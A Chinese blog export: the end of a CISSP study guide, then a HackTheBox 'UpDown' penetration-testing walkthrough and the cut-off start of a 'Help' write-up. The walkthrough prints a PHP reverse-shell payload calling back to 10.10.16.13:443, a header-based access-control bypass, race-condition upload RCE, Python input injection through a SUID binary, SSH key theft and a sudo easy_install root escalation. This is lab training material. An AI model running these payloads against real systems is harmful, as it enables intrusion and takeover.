密码安全与管理密码策略设计\n\n长度要求：最少8-12位\n复杂度：大小写、数字、特殊字符\n历史记录：避免重复使用\n失效期：定期更换（争议性）\n锁定策略：防止暴力破解\n\n密码攻击与防护\n\n字典攻击：常用密码列表\n暴力攻击：穷举所有可能\n彩虹表：预计算哈希值\n防护措施：\n加盐（Salt）：随机数据增加复杂度\n密钥延展：多次哈希计算\n账户锁定：限制尝试次数\n\n\n\n密码管理器\n\n生成复杂随机密码\n加密存储密码\n自动填充功能\n主密码保护\n多设备同步\n\n🏢 企业身份集成活动目录（Active Directory）\n\n域控制器：集中认证和授权\n组织单元（OU）：逻辑组织结构\n组策略（GPO）：批量配置管理\n信任关系：跨域认证\nLDAP协议：目录查询和管理\n\n身份即服务（IDaaS）\n\n云端身份管理\n预集成应用连接器\n自动用户预配\n高可用性和可扩展性\n合规性支持\n\n混合身份架构\n\n本地AD与云身份同步\n联邦身份信任\n条件访问策略\n风险评估引擎\n统一身份体验\n\n\n域6：安全评估与测试 (12%) - 验证与改进🔍 安全评估方法论安全测试（Security Testing）\n\n目的：验证安全控制有效性\n类型：\n功能测试：控制是否按设计工作\n性能测试：控制在负载下的表现\n压力测试：极限条件下的行为\n回归测试：变更后的影响验证\n\n\n\n安全评估（Security Assessment）\n\n目的：全面评估安全状况\n范围：技术、管理、物理控制\n方法：\n文档审查：策略、程序、配置\n访谈：关键人员和流程\n技术测试：工具扫描和手工测试\n观察：实际操作和环境\n\n\n\n安全审计（Security Audit）\n\n目的：独立验证合规性\n特点：\n第三方执行\n正式报告\n合规性焦点\n管理层关注\n纠正措施跟踪\n\n\n\n🎯 漏洞评估实践漏洞管理生命周期\n1. 资产发现   - 网络扫描   - 资产清单   - 服务识别2. 漏洞识别   - 自动化扫描   - 手工测试   - 威胁情报3. 风险评估   - CVSS评分   - 业务影响   - 可利用性4. 补救措施   - 补丁管理   - 配置加固   - 风险接受5. 验证确认   - 复测验证   - 持续监控   - 趋势分析\n\n漏洞扫描工具\n\n网络扫描：Nessus、OpenVAS、Qualys\nWeb应用：OWASP ZAP、Burp Suite、Acunetix\n数据库：SQLmap、DbProtect\n无线：Aircrack-ng、Kismet\n\n漏洞评分系统\n\nCVSS（通用漏洞评分系统）：\n基础评分：漏洞固有特性\n时间评分：利用代码、补丁可用性\n环境评分：组织特定因素\n\n\n评分范围：0.0-10.0\n严重级别：低（0.1-3.9）、中（4.0-6.9）、高（7.0-8.9）、严重（9.0-10.0）\n\n🔴 渗透测试深度渗透测试类型\n\n黑盒测试：\n零知识测试\n模拟外部攻击者\n发现对外暴露漏洞\n\n\n白盒测试：\n完全知识测试\n代码审查和架构分析\n深度技术漏洞挖掘\n\n\n灰盒测试：\n部分知识测试\n模拟内部威胁\n平衡覆盖度和效率\n\n\n\n渗透测试流程\n1. 规划与准备   - 确定测试范围   - 签署授权书   - 制定测试计划2. 信息收集   - 公开信息搜集   - 网络扫描   - 社会工程3. 漏洞发现   - 漏洞扫描   - 手工测试   - 0day研究4. 渗透利用   - 获取初始访问   - 权限提升   - 横向移动5. 后渗透   - 持久化访问   - 数据搜集   - 影响评估6. 报告输出   - 技术报告   - 管理层报告   - 修复建议\n\n社会工程测试\n\n钓鱼邮件测试：\n点击率统计\n凭据提交率\n恶意软件安装率\n\n\n电话测试（Vishing）：\n信息套取成功率\n员工警觉性\n报告机制有效性\n\n\n物理渗透：\n尾随成功率\n未授权区域访问\n敏感信息获取\n\n\n\n💻 软件安全测试静态应用安全测试（SAST）\n\n源代码分析\n不需要运行程序\n早期发现漏洞\n高覆盖率，误报率高\n工具：SonarQube、Checkmarx、Veracode\n\n动态应用安全测试（DAST）\n\n黑盒运行时测试\n模拟真实攻击\n低误报率，覆盖率有限\n工具：OWASP ZAP、Burp Suite、AppScan\n\n交互式应用安全测试（IAST）\n\n结合SAST和DAST优势\n运行时代码分析\n精确漏洞定位\n低误报率，高覆盖率\n\n软件组合分析（SCA）\n\n开源组件漏洞扫描\n许可证合规检查\n组件版本管理\n供应链安全\n\nAPI安全测试\n\nOWASP API Top 10：\n失效的对象级授权\n失效的用户认证\n过度的数据暴露\n缺乏资源和速率限制\n失效的功能级授权\n批量分配\n安全配置错误\n注入\n不当的资产管理\n日志记录和监控不足\n\n\n\n📊 安全度量与KPI关键绩效指标（KPI）\n\n安全事件指标：\n事件数量趋势\n平均检测时间（MTTD）\n平均响应时间（MTTR）\n事件解决率\n\n\n漏洞管理指标：\n漏洞发现数量\n修复时间分布\n逾期漏洞数量\n重复漏洞率\n\n\n合规性指标：\n合规评分\n审计发现数量\n整改完成率\n策略例外数量\n\n\n\n关键风险指标（KRI）\n\n威胁指标：\n高级持续威胁（APT）活动\n恶意软件检测率\n异常流量模式\n失陷指标（IoC）\n\n\n脆弱性指标：\n高危漏洞暴露时间\n未打补丁系统数量\n配置偏差数量\n过期账户数量\n\n\n\n安全成熟度评估\n\n能力成熟度模型：\n初始级：临时、被动\n可重复级：基本流程\n已定义级：标准化流程\n管理级：量化管理\n优化级：持续改进\n\n\n\n📋 合规性测试合规框架映射\n\nISO 27001：信息安全管理体系\nNIST Cybersecurity Framework：网络安全框架\nCIS Controls：关键安全控制\nCOBIT：IT治理框架\n\n行业特定合规\n\nPCI DSS：支付卡行业\n12项要求\n年度评估\n季度扫描\n\n\nHIPAA：医疗保健\n安全规则\n隐私规则\n违规通知规则\n\n\nSOX：萨班斯法案\nIT一般控制（ITGC）\n应用控制\n财务报告内控\n\n\n\n合规测试方法\n\n控制测试：验证控制设计和运行有效性\n实质性程序：直接测试合规结果\n穿行测试：跟踪完整业务流程\n抽样测试：统计学样本选择\n\n\n域7：安全运营 (13%) - 日常防护运营🚨 事件响应管理NIST事件响应生命周期\n1. 准备（Preparation）   - 建立CSIRT团队   - 制定响应程序   - 准备工具和资源   - 开展培训演练2. 检测与分析（Detection &amp; Analysis）   - 事件检测机制   - 初始分析评估   - 事件分类定级   - 证据收集保全3. 遏制、根除与恢复（Containment, Eradication &amp; Recovery）   - 短期遏制：立即停止损害扩散   - 长期遏制：系统隔离和加固   - 根除威胁：清除恶意代码和账户   - 系统恢复：恢复正常业务运营4. 事后活动（Post-Incident Activity）   - 经验教训总结   - 流程改进建议   - 证据归档保存   - 法律后续行动\n\n事件分类与优先级\n\n严重级别：\n低：单一用户影响，无业务中断\n中：部分用户影响，业务部分中断\n高：大量用户影响，关键业务中断\n严重：全面影响，业务完全停止\n\n\n事件类型：\n恶意软件感染\n拒绝服务攻击\n数据泄露事件\n内部威胁\n物理安全事件\n第三方安全事件\n\n\n\n计算机安全事件响应团队（CSIRT）\n\n团队组成：\n事件响应经理：统筹协调\n安全分析师：技术分析\n法律顾问：合规和法律事务\n公关代表：对外沟通\n业务代表：业务影响评估\n\n\n角色职责：\n24&#x2F;7监控和响应\n事件调查和分析\n威胁情报收集\n安全意识培训\n工具和程序维护\n\n\n\n📈 安全监控与SIEM安全信息与事件管理（SIEM）\n\n核心功能：\n日志聚合：集中收集各类日志\n关联分析：识别关联事件模式\n实时告警：异常行为即时通知\n合规报告：自动生成合规报告\n事件调查：提供分析工具\n\n\n数据源：\n网络设备：防火墙、路由器、交换机\n安全设备：IDS&#x2F;IPS、WAF、EPP\n服务器：Windows事件、Syslog\n应用程序：Web服务器、数据库\n云服务：AWS CloudTrail、Azure日志\n\n\n\n安全运营中心（SOC）\n\n组织结构：\nL1分析师：初始事件分拣\nL2分析师：深度事件调查\nL3分析师：高级威胁分析\nSOC经理：运营管理\n威胁猎手：主动威胁发现\n\n\n运营流程：\n7x24小时监控\n告警分拣和分析\n事件升级机制\n威胁情报集成\n持续流程改进\n\n\n\n日志管理最佳实践\n\n日志策略：\n集中化收集存储\n标准化格式和时间\n完整性保护措施\n适当的保留期限\n访问控制和审计\n\n\n重要日志类型：\n认证日志：登录成功&#x2F;失败\n授权日志：权限变更记录\n系统日志：系统启动和配置变更\n网络日志：连接和流量记录\n应用日志：业务操作记录\n\n\n\n🔄 运营流程管理变更管理流程\n1. 变更请求（RFC）   - 变更原因和目标   - 影响分析评估   - 风险评估报告   - 回滚计划制定2. 变更评估   - 技术影响分析   - 业务影响评估   - 安全风险评估   - 资源需求分析3. 变更批准   - 变更咨询委员会（CAB）   - 紧急变更流程   - 批准权限矩阵   - 条件批准机制4. 变更实施   - 变更窗口调度   - 实施步骤执行   - 进度监控跟踪   - 异常处理机制5. 变更验证   - 功能验证测试   - 性能影响评估   - 安全验证检查   - 用户接受确认6. 变更回顾   - 实施效果评估   - 经验教训总结   - 流程改进建议   - 文档更新维护\n\n配置管理\n\n配置基线：\n操作系统基线\n应用软件基线\n网络设备基线\n安全工具基线\n\n\n配置监控：\n配置偏差检测\n未授权变更告警\n合规性验证\n自动修复机制\n\n\n\n补丁管理流程\n1. 补丁识别   - 厂商安全公告   - 漏洞情报收集   - 系统清单对比   - 影响评估分析2. 补丁测试   - 测试环境部署   - 功能兼容性测试   - 性能影响评估   - 回滚程序验证3. 补丁部署   - 分阶段部署策略   - 关键系统优先   - 维护窗口安排   - 监控和验证4. 部署验证   - 功能验证测试   - 安全验证扫描   - 性能监控分析   - 用户反馈收集\n\n☁️ 云安全运营云服务模型安全职责\nIaaS（基础设施即服务）- 客户责任：操作系统、应用、数据、网络配置- 供应商责任：物理设施、虚拟化平台、网络基础设施PaaS（平台即服务）- 客户责任：应用程序、数据、用户访问管理- 供应商责任：操作系统、中间件、运行时环境SaaS（软件即服务）- 客户责任：数据、用户访问管理、配置设置- 供应商责任：应用程序、平台、基础设施\n\n云安全工具\n\n云安全态势管理（CSPM）：\n配置错误检测\n合规性监控\n安全基线对比\n自动修复建议\n\n\n云工作负载保护（CWPP）：\n容器安全扫描\n运行时保护\n行为分析监控\n威胁检测响应\n\n\n云访问安全代理（CASB）：\nSaaS应用可见性\n数据丢失防护\n威胁防护\n合规性监控\n\n\n\n容器安全运营\n\n镜像安全：\n基础镜像漏洞扫描\n恶意软件检测\n配置最佳实践检查\n签名验证机制\n\n\n运行时安全：\n容器行为监控\n异常活动检测\n网络流量分析\n文件系统完整性\n\n\n编排安全：\nKubernetes安全配置\nRBAC权限管理\n网络策略实施\n秘钥管理\n\n\n\n🔒 数据保护运营数据丢失防护（DLP）\n\n部署模式：\n网络DLP：监控网络流量中的数据\n端点DLP：监控终端设备上的数据\n存储DLP：扫描存储系统中的敏感数据\n云DLP：保护云环境中的数据\n\n\n检测技术：\n内容分析：关键词、正则表达式\n指纹技术：精确文档匹配\n统计分析：基于统计模型检测\n机器学习：行为模式识别\n\n\n\n备份与恢复运营\n\n3-2-1备份策略：\n3个数据副本\n2种不同存储介质\n1个异地备份\n\n\n备份类型：\n完全备份：所有数据完整副本\n增量备份：仅备份变更数据\n差异备份：自上次完全备份后的变更\n快照备份：时间点数据镜像\n\n\n恢复测试：\n定期恢复演练\nRTO&#x2F;RPO验证\n数据完整性检查\n流程有效性评估\n\n\n\n数据加密管理\n\n静态数据加密：\n数据库透明加密\n文件系统加密\n存储设备加密\n云存储加密\n\n\n传输数据加密：\nTLS&#x2F;SSL协议\nVPN隧道加密\n邮件加密\n文件传输加密\n\n\n密钥管理：\n硬件安全模块（HSM）\n密钥生命周期管理\n密钥轮换策略\n密钥恢复机制\n\n\n\n🛡️ 威胁情报运营威胁情报类型\n\n战略情报：长期威胁趋势和模式\n战术情报：攻击者TTP（战术、技术、程序）\n技术情报：IoC（失陷指标）和工具签名\n运营情报：正在进行的攻击活动\n\n威胁情报来源\n\n开源情报（OSINT）：\n公开报告和研究\n社交媒体监控\n技术论坛和博客\n政府公告\n\n\n商业情报：\n威胁情报供应商\n安全厂商报告\n专业咨询服务\n行业情报共享\n\n\n内部情报：\n安全事件分析\n蜜罐数据收集\n恶意软件分析\n网络流量分析\n\n\n\n威胁猎捕（Threat Hunting）\n\n主动威胁发现：\n假设驱动的调查\n行为基线偏差分析\n威胁情报指导搜索\n机器学习异常检测\n\n\n猎捕技术：\n数据栈分析\n时间线分析\n群集分析\n统计分析\n\n\n\n\n域8：软件开发安全 (11%) - 安全编码与开发🏗️ 安全软件开发生命周期SDL集成要点\n需求阶段：- 安全需求识别和分析- 威胁建模初步设计- 合规性要求梳理- 安全验收标准定义设计阶段：- 详细威胁建模- 安全架构设计- 攻击面分析- 安全控制设计开发阶段：- 安全编码标准- 代码审查机制- 静态分析工具- 安全库使用测试阶段：- 安全功能测试- 渗透测试- 动态分析- 安全回归测试部署阶段：- 安全配置管理- 运行时保护- 监控机制部署- 应急响应准备维护阶段：- 漏洞管理流程- 安全更新机制- 持续监控- 事件响应\n\nDevSecOps实践\n\n安全左移：\n早期安全介入\n自动化安全测试\n持续安全验证\n快速反馈机制\n\n\nCI&#x2F;CD安全集成：\n代码提交安全扫描\n构建流水线安全检查\n自动化部署安全验证\n运行时安全监控\n\n\n\n🛡️ 应用程序安全威胁OWASP Top 10 2021详解\n1. 失效的访问控制\n\n垂直权限提升：普通用户获得管理员权限\n水平权限提升：访问其他用户的数据\nIDOR（不安全直接对象引用）\n防护措施：\n默认拒绝访问\n最小权限原则\n访问控制矩阵\n服务端验证\n\n\n\n2. 加密机制失效\n\n明文传输敏感数据\n使用弱加密算法\n密钥管理不当\n防护措施：\n强制HTTPS传输\n使用强加密算法\n安全密钥管理\n敏感数据分类\n\n\n\n3. 注入攻击\n\nSQL注入：恶意SQL代码注入\nNoSQL注入：非关系型数据库注入\nLDAP注入：目录服务注入\n命令注入：操作系统命令注入\n防护措施：\n参数化查询\n输入验证\n最小权限数据库账户\nWAF防护\n\n\n\n4. 不安全设计\n\n缺乏安全设计原则\n威胁建模不足\n安全控制缺失\n防护措施：\n安全设计原则\n威胁建模实践\n安全架构审查\n防御性编程\n\n\n\n5. 安全配置错误\n\n默认账户和密码\n不必要的功能启用\n错误页面信息泄露\n防护措施：\n安全基线配置\n定期配置审查\n自动化配置管理\n最小化安装\n\n\n\n6. 易受攻击和过时的组件\n\n使用已知漏洞组件\n不及时更新补丁\n使用不受支持的版本\n防护措施：\n组件清单管理\n漏洞扫描\n及时更新补丁\n依赖管理工具\n\n\n\n7. 身份验证和会话管理缺陷\n\n弱密码策略\n会话固定攻击\n会话劫持风险\n防护措施：\n强身份验证\n安全会话管理\n多因素认证\n会话超时控制\n\n\n\n8. 软件和数据完整性故障\n\n不安全的反序列化\n供应链攻击\n自动更新机制缺陷\n防护措施：\n数字签名验证\n安全反序列化\n供应链安全\n完整性检查\n\n\n\n9. 安全日志记录和监控故障\n\n重要事件未记录\n日志信息不足\n监控告警缺失\n防护措施：\n全面日志记录\n实时监控告警\n日志保护措施\n事件响应集成\n\n\n\n10. 服务器端请求伪造（SSRF）\n\n内网服务访问\n云元数据泄露\n端口扫描攻击\n防护措施：\nURL白名单验证\n网络分段\n输入验证\n防火墙规则\n\n\n\n🔍 安全代码审查静态代码分析（SAST）\n\n优势：\n早期漏洞发现\n完整代码覆盖\n开发阶段集成\n修复成本较低\n\n\n局限性：\n误报率较高\n无法检测逻辑漏洞\n需要源代码访问\n运行时行为未知\n\n\n最佳实践：\n制定编码标准\n集成开发环境\n定期规则更新\n误报管理机制\n\n\n\n手工代码审查\n\n审查重点：\n输入验证机制\n输出编码实现\n身份验证逻辑\n授权检查机制\n错误处理方式\n日志记录内容\n\n\n审查流程：\n制定审查清单\n分配审查角色\n集中讨论问题\n跟踪修复进度\n验证修复效果\n\n\n\n🌐 Web应用安全跨站脚本攻击（XSS）\n\n反射型XSS：恶意脚本通过URL参数注入\n存储型XSS：恶意脚本存储在服务器上\nDOM型XSS：客户端脚本漏洞\n防护措施：\n输出编码\n内容安全策略（CSP）\nHTTPOnly Cookie\n输入验证\n\n\n\n跨站请求伪造（CSRF）\n\n攻击原理：利用用户认证状态执行恶意操作\n防护措施：\nCSRF令牌验证\nSameSite Cookie属性\n双重提交Cookie\n验证Referer头\n\n\n\n会话管理安全\n\n会话ID安全：\n随机性强\n长度足够\n定期轮换\n安全传输\n\n\n会话保护：\nHTTPOnly属性\nSecure属性\nSameSite属性\n会话超时\n\n\n\n安全HTTP头\nContent-Security-Policy: 防止XSS和数据注入X-Frame-Options: 防止点击劫持X-Content-Type-Options: 防止MIME类型嗅探Strict-Transport-Security: 强制HTTPSX-XSS-Protection: 启用XSS过滤器Referrer-Policy: 控制引用信息\n\n📱 移动应用安全OWASP移动应用Top 10\n\n平台使用不当\n不安全的数据存储\n不安全的通信\n不安全的身份验证\n不充分的加密\n不安全的授权\n客户端代码质量问题\n代码篡改\n逆向工程\n无关功能\n\n移动应用安全开发\n\nAndroid安全：\n权限模型理解\n组件安全配置\n数据加密存储\n网络安全通信\n代码混淆保护\n\n\niOS安全：\nKeychain服务使用\nApp Transport Security\n代码签名机制\n沙盒安全模型\n反调试技术\n\n\n\n🔧 安全开发工具开发环境安全\n\nIDE安全插件：\n实时漏洞检测\n安全编码提示\n合规性检查\n最佳实践建议\n\n\n版本控制安全：\n敏感信息扫描\n提交钩子检查\n访问权限控制\n审计日志记录\n\n\n\n自动化安全测试\n\n单元测试安全：\n输入验证测试\n边界条件测试\n异常处理测试\n权限检查测试\n\n\n集成测试安全：\nAPI安全测试\n数据流安全验证\n第三方集成安全\n端到端安全测试\n\n\n\n🚀 安全部署与运维容器化应用安全\n\nDocker安全：\n最小化基础镜像\n非root用户运行\n资源限制配置\n网络隔离策略\n\n\nKubernetes安全：\nPod安全策略\n网络策略配置\nRBAC权限控制\n秘钥管理\n\n\n\n微服务安全\n\n服务间通信：\nmTLS加密认证\nAPI网关统一认证\n服务网格安全\n零信任架构\n\n\n数据保护：\n服务数据隔离\n敏感数据加密\n数据传输安全\n审计日志记录\n\n\n\n无服务器安全\n\nFunction安全：\n最小权限原则\n依赖管理\n输入验证\n执行环境隔离\n\n\n事件驱动安全：\n事件源验证\n消息完整性\n异步处理安全\n监控告警\n\n\n\n\n🎯 考试重点总结📊 各域分值分布与重点\n域1 (15%)：风险管理计算、法律合规、治理体系\n域2 (10%)：数据分类、隐私保护、资产管理\n域3 (13%)：密码学应用、安全模型、系统架构\n域4 (13%)：网络协议、无线安全、网络防护\n域5 (13%)：访问控制模型、身份管理、认证技术\n域6 (12%)：测试方法、漏洞管理、合规评估\n域7 (13%)：事件响应、运营监控、威胁管理\n域8 (11%)：安全开发、代码审查、应用安全\n\n🧮 必须掌握的计算公式风险管理：AV × EF = SLESLE × ARO = ALE成本效益 = ALE前 - ALE后 - ACS生物识别：CER = FAR = FRR 的交叉点备份策略：3-2-1原则：3副本、2介质、1异地\n\n🔑 核心概念理解\n管理层思维：以CISO视角思考问题\n风险导向：平衡安全、成本、可用性\n纵深防御：多层次安全控制\n持续改进：PDCA循环应用\n合规优先：法律法规是底线\n\n📚 学习策略建议\n系统学习：先理解框架，再深入细节\n实践结合：结合工作经验思考应用\n重点突破：关注高分值域和薄弱环节\n多做练习：通过题目验证理解程度\n持续更新：关注最新威胁和技术发展\n\n✅ 考试答题技巧\n仔细读题：注意关键词和限定条件\n管理视角：选择最符合管理层期望的选项\n最佳实践：优先选择行业标准做法\n排除法：排除明显错误选项\n时间管理：合理分配答题时间\n\n🚀 备考冲刺要点\n记忆要点：法律法规、算法特点、端口号\n理解重点：访问控制模型、安全架构、事件响应\n应用难点：风险评估、威胁建模、安全设计\n综合能力：安全治理、合规管理、事件处置\n\n\n本学习指南基于firmianay.gitbook.io网站内容整理，结合CISSP考试要求和实际工作经验编写。建议结合官方学习指南和最新考试大纲进行系统学习。\n","categories":["CISSP"],"tags":["CISSP"]},{"title":"UpDown","url":"/2025/05/24/UpDown/","content":"UpDown HTB 渗透测试笔记整体渗透思路\n端口扫描发现80和22端口，Web应用”Is my Website up ?”\n目录扫描发现&#x2F;dev目录，子域名枚举找到dev.siteisup.htb\n发现.git仓库暴露，使用git-dumper获取完整源代码\n源码审计发现多个漏洞：访问控制绕过、LFI、文件上传、SSRF\n绕过.htaccess访问控制（Special-Dev头部），利用文件上传+竞态条件获得RCE\n发现SUID程序&#x2F;home&#x2F;developer&#x2F;dev&#x2F;siteisup，利用Python代码注入提权至developer\n发现sudo权限easy_install，使用GTFOBins技术提权至root\n\n端口扫描快速端口发现sudo nmap -sT --min-rate 10000 -p- 10.129.128.145\n\n参数解析：\n\n-sT: TCP连接扫描，完整三次握手，更准确但较慢\n--min-rate 10000: 最小发包速率10000包&#x2F;秒，加快扫描速度\n-p-: 扫描全部65535个端口\n\n详细服务识别nmap -sC -sV 10.129.128.145\n\n参数解析：\n\n-sC: 使用默认NSE脚本集合，等同于 --script=default\n-sV: 版本探测，识别服务版本信息\n\n扫描结果：\n\n22&#x2F;tcp: SSH OpenSSH 8.2p1 Ubuntu\n80&#x2F;tcp: HTTP Apache 2.4.41 (Ubuntu)\n\n信息收集域名发现访问80端口发现网站标题”Is my Website up ?”，页面源码中发现域名siteisup.htb\necho &quot;10.129.128.145 siteisup.htb&quot; &gt;&gt; /etc/hosts\n\n目录暴力破解ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 100 -mc 200,302,301 -u http://siteisup.htb/FUZZ\n\n参数解析：\n\n-w: 指定字典文件\n-t 100: 并发线程数100\n-mc 200,302,301: 匹配HTTP状态码\n-u http://siteisup.htb/FUZZ: 目标URL，FUZZ为占位符\n\n发现： /dev 目录 (Status: 301重定向)\n子域名枚举wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110.txt -H &quot;Host: FUZZ.siteisup.htb&quot; --hc 400 http://10.129.128.145/\n\n参数解析：\n\n-c: 彩色输出\n-H &quot;Host: FUZZ.siteisup.htb&quot;: 设置Host头进行虚拟主机枚举\n--hc 400: 隐藏HTTP 400状态码响应\n技术原理： 通过修改Host头部测试不同子域名，服务器根据Host头路由到不同虚拟主机\n\n发现子域名： dev.siteisup.htb\necho &quot;10.129.128.145 dev.siteisup.htb&quot; &gt;&gt; /etc/hosts\n\nGit仓库发现gobuster dir -u http://siteisup.htb/dev/ -w /usr/share/dirb/wordlists/common.txt\n\n参数解析：\n\ndir: 目录暴力破解模式\n-u: 目标URL\n-w: 字典文件\n\n关键发现： /.git/HEAD (Status: 200) - Git仓库暴露\nGit仓库利用Git仓库转储cd /home/kali/Downloads/git-dumperpython3 -m venv venvsource venv/bin/activatepip install dulwich beautifulsoup4python3 git_dumper.py http://siteisup.htb/dev/.git/ ./siteisup-source\n\n工具原理：\n\ngit-dumper通过访问.git目录的各种文件重建完整仓库\n利用Git的内部文件结构（objects、refs、index等）恢复源代码\n比直接访问.git&#x2F;config更全面，可获取完整提交历史\n\n源码文件结构siteisup-source/├── admin.php (59 bytes)├── changelog.txt (147 bytes)  ├── checker.php (3145 bytes) - 主要功能文件├── .htaccess (117 bytes) - Apache访问控制├── index.php (273 bytes) - 路由控制器└── stylesheet.css (5531 bytes)\n\n源代码分析.htaccess访问控制分析SetEnvIfNoCase Special-Dev &quot;only4dev&quot; Required-HeaderOrder Deny,AllowDeny from AllAllow from env=Required-Header\n\n机制解析：\n\nSetEnvIfNoCase: 不区分大小写设置环境变量\n当HTTP头Special-Dev值为only4dev时，设置环境变量Required-Header\nOrder Deny,Allow: 先拒绝所有，再根据Allow规则允许\nAllow from env=Required-Header: 只允许有该环境变量的请求\n\n绕过方法： 添加HTTP头部 Special-Dev: only4dev\nindex.php路由分析$page=$_GET[&#x27;page&#x27;];if($page &amp;&amp; !preg_match(&quot;/bin|usr|home|var|etc/i&quot;,$page))&#123;    include($_GET[&#x27;page&#x27;] . &quot;.php&quot;);&#125;else&#123;    include(&quot;checker.php&quot;);&#125;\n\n漏洞分析：\n\nLFI漏洞： 直接包含用户输入的文件\n过滤绕过： 正则只过滤特定目录名，可用../绕过\n文件扩展名： 自动添加.php后缀，限制了文件类型\n\nchecker.php文件上传分析// 文件大小检查if ($_FILES[&#x27;file&#x27;][&#x27;size&#x27;] &gt; 10000) &#123;    die(&quot;File too large!&quot;);&#125;// 危险扩展名过滤if(preg_match(&quot;/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i&quot;,$ext))&#123;    die(&quot;Extension not allowed!&quot;);&#125;// 文件上传到临时目录$dir = &quot;uploads/&quot;.md5(time()).&quot;/&quot;;$final_path = $dir.$file;move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], &quot;&#123;$final_path&#125;&quot;);// 处理后删除文件@unlink($final_path);\n\n漏洞点：\n\n扩展名绕过： .phar扩展名未被过滤，但PHP仍可执行\n竞态条件： 文件上传后到删除前存在时间窗口\n目录可预测： 使用md5(time())生成目录名，时间可预测\n\n漏洞利用竞态条件+文件上传RCE1. 构造恶意.phar文件cat &gt; shell.phar &lt;&lt; &#x27;EOF&#x27;http://httpbin.org/delay/5http://www.google.com&lt;?php$descriptorspec = array(    0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),    1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),     2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;));$cmd = &quot;/bin/bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.13/443 0&gt;&amp;1&#x27;&quot;;$proc = proc_open($cmd, $descriptorspec, $pipes);?&gt;EOF\n\n技术说明：\n\n文件伪装： 前两行是正常URL，绕过内容检测\n反向Shell： 使用proc_open执行bash反向连接\n重定向机制： &gt;&amp; 将标准输出和错误都重定向到网络连接\n\n2. 启动监听器nc -nlvp 443\n\n参数解析：\n\n-n: 不进行DNS解析，提高连接速度\n-l: 监听模式\n-v: 详细输出\n-p 443: 监听443端口\n\n3. 利用时序窗口攻击流程：\n\n上传shell.phar到 http://dev.siteisup.htb/?page=checker\n添加绕过头部: Special-Dev: only4dev\n利用checker.php处理URL的延时（httpbin.org&#x2F;delay&#x2F;5）\n在文件被unlink删除前访问执行\n\n时间窗口原理：\n\nchecker.php先保存文件，再处理URL内容\n处理延时URL时，文件仍存在服务器上\n此时通过LFI包含上传的文件即可执行PHP代码\n\n4. 获得初始Shellwww-data@updown:/var/www/dev/uploads/ba1525b4df3af4568bdb8ad883e9adac$\n\n权限提升1: www-data → developer系统信息收集whoami  # www-dataid      # uid=33(www-data) gid=33(www-data) groups=33(www-data)find / -name &quot;user.txt&quot; 2&gt;/dev/null  # /home/developer/user.txt\n\nSUID程序发现find / -perm -4000 2&gt;/dev/null | grep -v &#x27;/usr\\|/bin&#x27;ls -la /home/developer/dev/\n\n关键发现：\n-rwsr-x--- 1 developer www-data  16928 Jun 22  2022 siteisup-rwxr-x--- 1 developer www-data    154 Jun 22  2022 siteisup_test.py\n\nSUID权限分析：\n\ns位表示SUID权限，执行时以文件所有者权限运行\n文件所有者是developer，www-data组可执行\n执行时将获得developer用户权限\n\n程序逆向分析strings siteisupfile siteisup  # ELF 64-bit LSB executable\n\n关键字符串发现：\n/usr/bin/python /home/developer/dev/siteisup_test.py\n\n程序工作原理：\n\nC程序调用Python脚本处理用户输入\n用户输入传递给Python脚本的URL验证函数\nPython的input()函数可被代码注入\n\nPython代码注入利用./siteisupWelcome to &#x27;siteisup.htb&#x27; applicationEnter URL here: __import__(&#x27;os&#x27;).system(&#x27;bash&#x27;)\n\n注入原理：\n\nPython的input()函数在某些情况下可执行Python代码\n__import__(&#39;os&#39;).system(&#39;bash&#39;)动态导入os模块并执行系统命令\n由于SUID权限，bash以developer权限启动\n\n成功提权： developer@updown:/home/developer/dev$\n获取稳定SSH访问./siteisupEnter URL here: __import__(&#x27;os&#x27;).system(&#x27;cat /home/developer/.ssh/id_rsa&#x27;)\n\n保存并使用私钥：\n# 本地保存私钥vim developer_id_rsachmod 600 developer_id_rsassh -i developer_id_rsa developer@10.129.128.145\n\n权限提升2: developer → rootSudo权限检查sudo -l\n\n输出分析：\nUser developer may run the following commands on localhost:    (ALL) NOPASSWD: /usr/local/bin/easy_install\n\n\n(ALL): 可以以任何用户身份执行\nNOPASSWD: 无需输入密码\n/usr/local/bin/easy_install: 可执行的具体程序\n\nGTFOBins技术利用GTFOBins原理：\n\nGTFOBins是Unix二进制程序的权限提升技术集合\n利用程序的设计功能实现意外的权限提升\neasy_install可以执行setup.py中的任意Python代码\n\neasy_install提权利用TF=$(mktemp -d)echo &quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#x27;)&quot; &gt; $TF/setup.pysudo /usr/local/bin/easy_install $TF\n\n技术解析：\n\nmktemp -d: 创建临时目录\nos.execl(): 替换当前进程执行新程序\nsh &lt;$(tty) &gt;$(tty) 2&gt;$(tty): 将shell的输入输出重定向到当前终端\neasy_install执行setup.py时会以root权限运行Python代码\n\n成功获得root： root@updown:/tmp/tmp.6bPxETrQln#\nShell稳定化python3 -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;export TERM=xterm\n\n获取FlagUser Flagcat /home/developer/user.txt\n\nRoot Flagcat /root/root.txt\n\n关键技术总结信息收集技术：\n\nNmap端口扫描和服务识别\n子域名枚举技术（Host头爆破）\nGit仓库暴露利用\n\nWeb应用攻击：\n\nHTTP头部绕过访问控制\n竞态条件攻击\n文件上传绕过技术\n本地文件包含(LFI)利用\n\n权限提升技术：\n\nSUID程序分析和利用\nPython代码注入攻击\nGTFOBins二进制利用技术\nSudo权限滥用\n\n","categories":["OSCP"],"tags":["Hackthebox","Linux Boxes"]},{"title":"Help","url":"/2025/05/24/Help/","content":"Help HTB 渗透测试笔记整体渗透思路\n端口扫描发现22、80、3000端口，80端口重定向到help.htb\n80端口发现HelpDeskZ帮助台系统，3000端口发现GraphQL API\nGraphQL schema 